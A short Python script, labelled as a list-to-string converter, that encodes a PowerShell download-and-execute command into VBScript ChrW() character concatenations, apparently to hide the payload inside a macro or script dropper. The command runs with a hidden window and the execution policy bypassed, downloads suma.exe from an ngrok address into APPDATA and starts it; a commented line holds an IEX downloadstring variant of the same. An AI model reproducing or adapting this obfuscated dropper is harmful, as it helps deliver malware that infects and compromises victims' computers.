# Python program to convert a list to string
    
# Function to convert  
def listToString(s): 
    
    # initialize an empty string
    str1 = "" 
    
    # traverse in the string  
    for ele in s: 
        str1 += ele  
    
    # return string  
    return str1 

#input = "powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://867610452d3a.ngrok.io/example/suma.exe'))\""
input = "powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://867610452d3a.ngrok.io/example/suma.exe',\"$env:APPDATA\$ProcName\");Start-Process (\"$env:APPDATA\suma.exe\")"
output = ['ChrW('+str(ord(l))+')&' for l in input]


print(listToString(output))
	